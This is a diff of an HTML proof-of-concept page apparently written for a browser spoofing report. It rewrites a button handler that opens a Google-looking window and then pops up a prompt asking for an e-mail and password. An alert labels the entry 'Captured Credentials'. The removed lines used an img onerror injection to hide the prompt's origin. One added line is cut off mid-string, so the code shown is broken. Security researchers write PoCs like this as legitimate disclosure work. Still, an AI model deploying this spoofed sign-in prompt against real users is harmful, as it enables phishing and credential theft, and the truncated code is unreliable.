@@ -22,32 +22,23 @@
 </head>
 <body>
 
-  <button onclick="executeSpoof()">Start Test</button>
+  <button onclick="executeSpoof()">Click to PoC</button>
 
   <script>
     function executeSpoof() {
-      let win = window.open('https://accounts.google.com/', '_top');
+      document.body.innerHTML = `
+        <div style="text-align:center; padding: 50px;">
+          <h1 style="color: red;">This is not Google!</h1>
+          <p>This is an attacker-controlled page rendering custom HTML.</p>
+        </div>
+      `;
+      let win = window.open('https://google.com:8888', '_top
       setTimeout(() => {
-        try {
-          win.document.write(`
-            <body style="margin:0; padding:20px; text-align:center;">
-              <h2>Loading Google Services...</h2>
-              <!-- 3. Injeksi Image Onerror untuk memicu prompt modal tanpa origin attribution -->
-              <img src="" onerror="
-                setTimeout(function() {
-                  let user = prompt('Sign into your account in order to access www.google.com', 'E-mail / Password');
-                  if (user) {
-                    alert('Captured Credentials: ' + user);
-                  }
-                }, 100);
-              ">
-            </body>
-          `);
-          win.document.close();
-        } catch (e) {
-          console.warn("Cross-Origin restriction enforced:", e);
+        let user = prompt('Sign into your account in order to access www.google.com', 'Enter E-mail / Password');
+        if (user) {
+          alert('Captured Credentials: ' + user);
         }
-      }, 50);
+      }, 100);
     }
   </script>
 
